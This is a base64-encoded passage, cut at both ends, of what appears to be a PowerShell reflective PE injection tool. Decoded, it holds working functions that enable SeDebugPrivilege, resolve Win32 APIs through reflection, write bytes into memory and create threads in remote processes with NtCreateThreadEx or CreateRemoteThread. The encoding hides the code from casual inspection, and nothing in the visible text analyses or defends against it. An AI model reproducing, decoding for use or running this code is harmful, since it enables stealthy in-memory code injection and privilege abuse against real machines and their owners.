gICAgJEZpbmFsQnl0ZXNbJGldID0gJFN1bSAtYmFuZCAweDAwRkYKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgKCgkU3VtIC1iYW5kIDB4RkYwMCkgLWVxIDB4MTAwKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRDYXJyeU92ZXIgPSAxCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJENhcnJ5T3ZlciA9IDAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiQ2Fubm90IGFkZCBieXRlYXJyYXlzIG9mIGRpZmZlcmVudCBzaXplcyIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgcmV0dXJuIFtCaXRDb252ZXJ0ZXJdOjpUb0ludDY0KCRGaW5hbEJ5dGVzLCAwKQogICAgfQogICAgCgogICAgRnVuY3Rpb24gQ29tcGFyZS1WYWwxR3JlYXRlclRoYW5WYWwyQXNVSW50CiAgICB7CiAgICAgICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbSW50NjRdCiAgICAgICAgJFZhbHVlMSwKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtJbnQ2NF0KICAgICAgICAkVmFsdWUyCiAgICAgICAgKQogICAgICAgIAogICAgICAgIFtCeXRlW11dJFZhbHVlMUJ5dGVzID0gW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRWYWx1ZTEpCiAgICAgICAgW0J5dGVbXV0kVmFsdWUyQnl0ZXMgPSBbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJFZhbHVlMikKCiAgICAgICAgaWYgKCRWYWx1ZTFCeXRlcy5Db3VudCAtZXEgJFZhbHVlMkJ5dGVzLkNvdW50KQogICAgICAgIHsKICAgICAgICAgICAgZm9yICgkaSA9ICRWYWx1ZTFCeXRlcy5Db3VudC0xOyAkaSAtZ2UgMDsgJGktLSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWYgKCRWYWx1ZTFCeXRlc1skaV0gLWd0ICRWYWx1ZTJCeXRlc1skaV0pCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICR0cnVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYgKCRWYWx1ZTFCeXRlc1skaV0gLWx0ICRWYWx1ZTJCeXRlc1skaV0pCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICRmYWxzZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJDYW5ub3QgY29tcGFyZSBieXRlIGFycmF5cyBvZiBkaWZmZXJlbnQgc2l6ZSIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgcmV0dXJuICRmYWxzZQogICAgfQogICAgCgogICAgRnVuY3Rpb24gQ29udmVydC1VSW50VG9JbnQKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtVSW50NjRdCiAgICAgICAgJFZhbHVlCiAgICAgICAgKQogICAgICAgIAogICAgICAgIFtCeXRlW11dJFZhbHVlQnl0ZXMgPSBbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJFZhbHVlKQogICAgICAgIHJldHVybiAoW0JpdENvbnZlcnRlcl06OlRvSW50NjQoJFZhbHVlQnl0ZXMsIDApKQogICAgfQoKCiAgICBGdW5jdGlvbiBHZXQtSGV4CiAgICB7CiAgICAgICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICAkVmFsdWUgI1dlIHdpbGwgZGV0ZXJtaW5lIHRoZSB0eXBlIGR5bmFtaWNhbGx5CiAgICAgICAgKQoKICAgICAgICAkVmFsdWVTaXplID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXSRWYWx1ZS5HZXRUeXBlKCkpICogMgogICAgICAgICRIZXggPSAiMHh7MDpYJCgkVmFsdWVTaXplKX0iIC1mIFtJbnQ2NF0kVmFsdWUgI1Bhc3NpbmcgYSBJbnRQdHIgdG8gdGhpcyBkb2Vzbid0IHdvcmsgd2VsbC4gQ2FzdCB0byBJbnQ2NCBmaXJzdC4KCiAgICAgICAgcmV0dXJuICRIZXgKICAgIH0KICAgIAogICAgCiAgICBGdW5jdGlvbiBUZXN0LU1lbW9yeVJhbmdlVmFsaWQKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERlYnVnU3RyaW5nLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N5c3RlbS5PYmplY3RdCiAgICAgICAgJFBFSW5mbywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtJbnRQdHJdCiAgICAgICAgJFN0YXJ0QWRkcmVzcywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAiU2l6ZSIsIFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtJbnRQdHJdCiAgICAgICAgJFNpemUKICAgICAgICApCiAgICAgICAgCiAgICAgICAgW0ludFB0cl0kRmluYWxFbmRBZGRyZXNzID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRTdGFydEFkZHJlc3MpICgkU2l6ZSkpCiAgICAgICAgCiAgICAgICAgJFBFRW5kQWRkcmVzcyA9ICRQRUluZm8uRW5kQWRkcmVzcwogICAgICAgIAogICAgICAgIGlmICgoQ29tcGFyZS1WYWwxR3JlYXRlclRoYW5WYWwyQXNVSW50ICgkUEVJbmZvLlBFSGFuZGxlKSAoJFN0YXJ0QWRkcmVzcykpIC1lcSAkdHJ1ZSkKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJUcnlpbmcgdG8gd3JpdGUgdG8gbWVtb3J5IHNtYWxsZXIgdGhhbiBhbGxvY2F0ZWQgYWRkcmVzcyByYW5nZS4gJERlYnVnU3RyaW5nIgogICAgICAgIH0KICAgICAgICBpZiAoKENvbXBhcmUtVmFsMUdyZWF0ZXJUaGFuVmFsMkFzVUludCAoJEZpbmFsRW5kQWRkcmVzcykgKCRQRUVuZEFkZHJlc3MpKSAtZXEgJHRydWUpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVHJ5aW5nIHRvIHdyaXRlIHRvIG1lbW9yeSBncmVhdGVyIHRoYW4gYWxsb2NhdGVkIGFkZHJlc3MgcmFuZ2UuICREZWJ1Z1N0cmluZyIKICAgICAgICB9CiAgICB9CiAgICAKICAgIAogICAgRnVuY3Rpb24gV3JpdGUtQnl0ZXNUb01lbW9yeQogICAgewogICAgICAgIFBhcmFtKAogICAgICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICAgICAgW0J5dGVbXV0KICAgICAgICAgICAgJEJ5dGVzLAogICAgICAgICAgICAKICAgICAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbj0xLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgICAgIFtJbnRQdHJdCiAgICAgICAgICAgICRNZW1vcnlBZGRyZXNzCiAgICAgICAgKQogICAgCiAgICAgICAgZm9yICgkT2Zmc2V0ID0gMDsgJE9mZnNldCAtbHQgJEJ5dGVzLkxlbmd0aDsgJE9mZnNldCsrKQogICAgICAgIHsKICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6V3JpdGVCeXRlKCRNZW1vcnlBZGRyZXNzLCAkT2Zmc2V0LCAkQnl0ZXNbJE9mZnNldF0pCiAgICAgICAgfQogICAgfQogICAgCgogICAgI0Z1bmN0aW9uIHdyaXR0ZW4gYnkgTWF0dCBHcmFlYmVyLCBUd2l0dGVyOiBAbWF0dGlmZXN0YXRpb24sIEJsb2c6IGh0dHA6Ly93d3cuZXhwbG9pdC1tb25kYXkuY29tLwogICAgRnVuY3Rpb24gR2V0LURlbGVnYXRlVHlwZQogICAgewogICAgICAgIFBhcmFtCiAgICAgICAgKAogICAgICAgICAgICBbT3V0cHV0VHlwZShbVHlwZV0pXQogICAgICAgICAgICAKICAgICAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAwKV0KICAgICAgICAgICAgW1R5cGVbXV0KICAgICAgICAgICAgJFBhcmFtZXRlcnMgPSAoTmV3LU9iamVjdCBUeXBlW10oMCkpLAogICAgICAgICAgICAKICAgICAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAxICldCiAgICAgICAgICAgIFtUeXBlXQogICAgICAgICAgICAkUmV0dXJuVHlwZSA9IFtWb2lkXQogICAgICAgICkKCiAgICAgICAgJERvbWFpbiA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluCiAgICAgICAgJER5bkFzc2VtYmx5ID0gTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseU5hbWUoJ1JlZmxlY3RlZERlbGVnYXRlJykKICAgICAgICAkQXNzZW1ibHlCdWlsZGVyID0gJERvbWFpbi5EZWZpbmVEeW5hbWljQXNzZW1ibHkoJER5bkFzc2VtYmx5LCBbU3lzdGVtLlJlZmxlY3Rpb24uRW1pdC5Bc3NlbWJseUJ1aWxkZXJBY2Nlc3NdOjpSdW4pCiAgICAgICAgJE1vZHVsZUJ1aWxkZXIgPSAkQXNzZW1ibHlCdWlsZGVyLkRlZmluZUR5bmFtaWNNb2R1bGUoJ0luTWVtb3J5TW9kdWxlJywgJGZhbHNlKQogICAgICAgICRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKICAgICAgICAkQ29uc3RydWN0b3JCdWlsZGVyID0gJFR5cGVCdWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJFBhcmFtZXRlcnMpCiAgICAgICAgJENvbnN0cnVjdG9yQnVpbGRlci5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKICAgICAgICAkTWV0aG9kQnVpbGRlciA9ICRUeXBlQnVpbGRlci5EZWZpbmVNZXRob2QoJ0ludm9rZScsICdQdWJsaWMsIEhpZGVCeVNpZywgTmV3U2xvdCwgVmlydHVhbCcsICRSZXR1cm5UeXBlLCAkUGFyYW1ldGVycykKICAgICAgICAkTWV0aG9kQnVpbGRlci5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKICAgICAgICAKICAgICAgICBXcml0ZS1PdXRwdXQgJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQogICAgfQoKCiAgICAjRnVuY3Rpb24gd3JpdHRlbiBieSBNYXR0IEdyYWViZXIsIFR3aXR0ZXI6IEBtYXR0aWZlc3RhdGlvbiwgQmxvZzogaHR0cDovL3d3dy5leHBsb2l0LW1vbmRheS5jb20vCiAgICBGdW5jdGlvbiBHZXQtUHJvY0FkZHJlc3MKICAgIHsKICAgICAgICBQYXJhbQogICAgICAgICgKICAgICAgICAgICAgW091dHB1dFR5cGUoW0ludFB0cl0pXQogICAgICAgIAogICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlICldCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICRNb2R1bGUsCiAgICAgICAgICAgIAogICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICRUcnVlICldCiAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICRQcm9jZWR1cmUKICAgICAgICApCgogICAgICAgICMgR2V0IGEgcmVmZXJlbmNlIHRvIFN5c3RlbS5kbGwgaW4gdGhlIEdBQwogICAgICAgICRTeXN0ZW1Bc3NlbWJseSA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfQogICAgICAgICRVbnNhZmVOYXRpdmVNZXRob2RzID0gJFN5c3RlbUFzc2VtYmx5LkdldFR5cGUoJ01pY3Jvc29mdC5XaW4zMi5VbnNhZmVOYXRpdmVNZXRob2RzJykKICAgICAgICAjIEdldCBhIHJlZmVyZW5jZSB0byB0aGUgR2V0TW9kdWxlSGFuZGxlIGFuZCBHZXRQcm9jQWRkcmVzcyBtZXRob2RzCiAgICAgICAgJEdldE1vZHVsZUhhbmRsZSA9ICRVbnNhZmVOYXRpdmVNZXRob2RzLkdldE1ldGhvZCgnR2V0TW9kdWxlSGFuZGxlJykKICAgICAgICAkR2V0UHJvY0FkZHJlc3MgPSAkVW5zYWZlTmF0aXZlTWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJykKICAgICAgICAjIEdldCBhIGhhbmRsZSB0byB0aGUgbW9kdWxlIHNwZWNpZmllZAogICAgICAgICRLZXJuMzJIYW5kbGUgPSAkR2V0TW9kdWxlSGFuZGxlLkludm9rZSgkbnVsbCwgQCgkTW9kdWxlKSkKICAgICAgICAkdG1wUHRyID0gTmV3LU9iamVjdCBJbnRQdHIKICAgICAgICAkSGFuZGxlUmVmID0gTmV3LU9iamVjdCBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuSGFuZGxlUmVmKCR0bXBQdHIsICRLZXJuMzJIYW5kbGUpCgogICAgICAgICMgUmV0dXJuIHRoZSBhZGRyZXNzIG9mIHRoZSBmdW5jdGlvbgogICAgICAgIFdyaXRlLU91dHB1dCAkR2V0UHJvY0FkZHJlc3MuSW52b2tlKCRudWxsLCBAKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuSGFuZGxlUmVmXSRIYW5kbGVSZWYsICRQcm9jZWR1cmUpKQogICAgfQogICAgCiAgICAKICAgIEZ1bmN0aW9uIEVuYWJsZS1TZURlYnVnUHJpdmlsZWdlCiAgICB7CiAgICAgICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkV2luMzJGdW5jdGlvbnMsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkV2luMzJUeXBlcywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRXaW4zMkNvbnN0YW50cwogICAgICAgICkKICAgICAgICAKICAgICAgICBbSW50UHRyXSRUaHJlYWRIYW5kbGUgPSAkV2luMzJGdW5jdGlvbnMuR2V0Q3VycmVudFRocmVhZC5JbnZva2UoKQogICAgICAgIGlmICgkVGhyZWFkSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gZ2V0IHRoZSBoYW5kbGUgdG8gdGhlIGN1cnJlbnQgdGhyZWFkIgogICAgICAgIH0KICAgICAgICAKICAgICAgICBbSW50UHRyXSRUaHJlYWRUb2tlbiA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgW0Jvb2xdJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5PcGVuVGhyZWFkVG9rZW4uSW52b2tlKCRUaHJlYWRIYW5kbGUsICRXaW4zMkNvbnN0YW50cy5UT0tFTl9RVUVSWSAtYm9yICRXaW4zMkNvbnN0YW50cy5UT0tFTl9BREpVU1RfUFJJVklMRUdFUywgJGZhbHNlLCBbUmVmXSRUaHJlYWRUb2tlbikKICAgICAgICBpZiAoJFJlc3VsdCAtZXEgJGZhbHNlKQogICAgICAgIHsKICAgICAgICAgICAgJEVycm9yQ29kZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKICAgICAgICAgICAgaWYgKCRFcnJvckNvZGUgLWVxICRXaW4zMkNvbnN0YW50cy5FUlJPUl9OT19UT0tFTikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5JbXBlcnNvbmF0ZVNlbGYuSW52b2tlKDMpCiAgICAgICAgICAgICAgICBpZiAoJFJlc3VsdCAtZXEgJGZhbHNlKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gaW1wZXJzb25hdGUgc2VsZiIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5PcGVuVGhyZWFkVG9rZW4uSW52b2tlKCRUaHJlYWRIYW5kbGUsICRXaW4zMkNvbnN0YW50cy5UT0tFTl9RVUVSWSAtYm9yICRXaW4zMkNvbnN0YW50cy5UT0tFTl9BREpVU1RfUFJJVklMRUdFUywgJGZhbHNlLCBbUmVmXSRUaHJlYWRUb2tlbikKICAgICAgICAgICAgICAgIGlmICgkUmVzdWx0IC1lcSAkZmFsc2UpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBPcGVuVGhyZWFkVG9rZW4uIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBPcGVuVGhyZWFkVG9rZW4uIEVycm9yIGNvZGU6ICRFcnJvckNvZGUiCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgCiAgICAgICAgW0ludFB0cl0kUEx1aWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXSRXaW4zMlR5cGVzLkxVSUQpKQogICAgICAgICRSZXN1bHQgPSAkV2luMzJGdW5jdGlvbnMuTG9va3VwUHJpdmlsZWdlVmFsdWUuSW52b2tlKCRudWxsLCAiU2VEZWJ1Z1ByaXZpbGVnZSIsICRQTHVpZCkKICAgICAgICBpZiAoJFJlc3VsdCAtZXEgJGZhbHNlKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBjYWxsIExvb2t1cFByaXZpbGVnZVZhbHVlIgogICAgICAgIH0KCiAgICAgICAgW1VJbnQzMl0kVG9rZW5Qcml2U2l6ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kV2luMzJUeXBlcy5UT0tFTl9QUklWSUxFR0VTKQogICAgICAgIFtJbnRQdHJdJFRva2VuUHJpdmlsZWdlc01lbSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkVG9rZW5Qcml2U2l6ZSkKICAgICAgICAkVG9rZW5Qcml2aWxlZ2VzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFRva2VuUHJpdmlsZWdlc01lbSwgW1R5cGVdJFdpbjMyVHlwZXMuVE9LRU5fUFJJVklMRUdFUykKICAgICAgICAkVG9rZW5Qcml2aWxlZ2VzLlByaXZpbGVnZUNvdW50ID0gMQogICAgICAgICRUb2tlblByaXZpbGVnZXMuUHJpdmlsZWdlcy5MdWlkID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFBMdWlkLCBbVHlwZV0kV2luMzJUeXBlcy5MVUlEKQogICAgICAgICRUb2tlblByaXZpbGVnZXMuUHJpdmlsZWdlcy5BdHRyaWJ1dGVzID0gJFdpbjMyQ29uc3RhbnRzLlNFX1BSSVZJTEVHRV9FTkFCTEVECiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJFRva2VuUHJpdmlsZWdlcywgJFRva2VuUHJpdmlsZWdlc01lbSwgJHRydWUpCgogICAgICAgICRSZXN1bHQgPSAkV2luMzJGdW5jdGlvbnMuQWRqdXN0VG9rZW5Qcml2aWxlZ2VzLkludm9rZSgkVGhyZWFkVG9rZW4sICRmYWxzZSwgJFRva2VuUHJpdmlsZWdlc01lbSwgJFRva2VuUHJpdlNpemUsIFtJbnRQdHJdOjpaZXJvLCBbSW50UHRyXTo6WmVybykKICAgICAgICAkRXJyb3JDb2RlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKSAjTmVlZCB0aGlzIHRvIGdldCBzdWNjZXNzIHZhbHVlIG9yIGZhaWx1cmUgdmFsdWUKICAgICAgICBpZiAoKCRSZXN1bHQgLWVxICRmYWxzZSkgLW9yICgkRXJyb3JDb2RlIC1uZSAwKSkKICAgICAgICB7CiAgICAgICAgICAgICNUaHJvdyAiVW5hYmxlIHRvIGNhbGwgQWRqdXN0VG9rZW5Qcml2aWxlZ2VzLiBSZXR1cm4gdmFsdWU6ICRSZXN1bHQsIEVycm9yY29kZTogJEVycm9yQ29kZSIgICAjdG9kbyBuZWVkIHRvIGRldGVjdCBpZiBhbHJlYWR5IHNldAogICAgICAgIH0KICAgICAgICAKICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpGcmVlSEdsb2JhbCgkVG9rZW5Qcml2aWxlZ2VzTWVtKQogICAgfQogICAgCiAgICAKICAgIEZ1bmN0aW9uIENyZWF0ZS1SZW1vdGVUaHJlYWQKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtJbnRQdHJdCiAgICAgICAgJFByb2Nlc3NIYW5kbGUsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbSW50UHRyXQogICAgICAgICRTdGFydEFkZHJlc3MsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW0ludFB0cl0KICAgICAgICAkQXJndW1lbnRQdHIgPSBbSW50UHRyXTo6WmVybywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRXaW4zMkZ1bmN0aW9ucwogICAgICAgICkKICAgICAgICAKICAgICAgICBbSW50UHRyXSRSZW1vdGVUaHJlYWRIYW5kbGUgPSBbSW50UHRyXTo6WmVybwogICAgICAgIAogICAgICAgICRPU1ZlcnNpb24gPSBbRW52aXJvbm1lbnRdOjpPU1ZlcnNpb24uVmVyc2lvbgogICAgICAgICNWaXN0YSBhbmQgV2luNwogICAgICAgIGlmICgoJE9TVmVyc2lvbiAtZ2UgKE5ldy1PYmplY3QgJ1ZlcnNpb24nIDYsMCkpIC1hbmQgKCRPU1ZlcnNpb24gLWx0IChOZXctT2JqZWN0ICdWZXJzaW9uJyA2LDIpKSkKICAgICAgICB7CiAgICAgICAgICAgICNXcml0ZS1WZXJib3NlICJXaW5kb3dzIFZpc3RhLzcgZGV0ZWN0ZWQsIHVzaW5nIE50Q3JlYXRlVGhyZWFkRXguIEFkZHJlc3Mgb2YgdGhyZWFkOiAkU3RhcnRBZGRyZXNzIgogICAgICAgICAgICAkUmV0VmFsPSAkV2luMzJGdW5jdGlvbnMuTnRDcmVhdGVUaHJlYWRFeC5JbnZva2UoW1JlZl0kUmVtb3RlVGhyZWFkSGFuZGxlLCAweDFGRkZGRiwgW0ludFB0cl06Olplcm8sICRQcm9jZXNzSGFuZGxlLCAkU3RhcnRBZGRyZXNzLCAkQXJndW1lbnRQdHIsICRmYWxzZSwgMCwgMHhmZmZmLCAweGZmZmYsIFtJbnRQdHJdOjpaZXJvKQogICAgICAgICAgICAkTGFzdEVycm9yID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQogICAgICAgICAgICBpZiAoJFJlbW90ZVRocmVhZEhhbmRsZSAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICJFcnJvciBpbiBOdENyZWF0ZVRocmVhZEV4LiBSZXR1cm4gdmFsdWU6ICRSZXRWYWwuIExhc3RFcnJvcjogJExhc3RFcnJvciIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAjWFAvV2luOAogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICNXcml0ZS1WZXJib3NlICJXaW5kb3dzIFhQLzggZGV0ZWN0ZWQsIHVzaW5nIENyZWF0ZVJlbW90ZVRocmVhZC4gQWRkcmVzcyBvZiB0aHJlYWQ6ICRTdGFydEFkZHJlc3MiCiAgICAgICAgICAgICRSZW1vdGVUaHJlYWRIYW5kbGUgPSAkV2luMzJGdW5jdGlvbnMuQ3JlYXRlUmVtb3RlVGhyZWFkLkludm9rZSgkUHJvY2Vzc0hhbmRsZSwgW0ludFB0cl06Olplcm8sIFtVSW50UHRyXVtVSW50NjRdMHhGRkZGLCAkU3RhcnRBZGRyZXNzLCAkQXJndW1lbnRQdHIsIDAsIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIH0KICAgICAgICAKICAgICAgICBpZiAoJFJlbW90ZVRocmVhZEhhbmRsZSAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1FcnJvciAiRXJyb3IgY3JlYXRpbmcgcmVtb3RlIHRocmVhZCwgdGhyZWFkIGhhbmRsZSBpcyBudWxsIiAtRXJyb3JBY3Rpb24gU3RvcAogICAgICAgIH0KICAgICAgICAKICAgICAgICByZXR1cm4gJFJlbW90ZVRocmVhZEhhbmRsZQogICAgfQoKICAgIAoKICAgIEZ1bmN0aW9uIEdldC1JbWFnZU50SGVhZGVycwogICAgewogICAgICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW0ludFB0cl0KICAgICAgICAkUEVIYW5kbGUsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkV2luMzJUeXBlcwogICAgICAgICkKICAgICAgICAKICAgICAgICAkTnRIZWFkZXJzSW5mbyA9IE5ldy1PYmplY3QgU3lzdGVtLk9iamVjdAogICAgICAgIAogICAgICAgICNOb3JtYWxseSB3b3VsZCB2YWxpZGF0ZSBET1NIZWFkZXIgaGVyZSwgYnV0IHdlIGRpZCBpdCBiZWZvcmUgdGhpcyBmdW5jdGlvb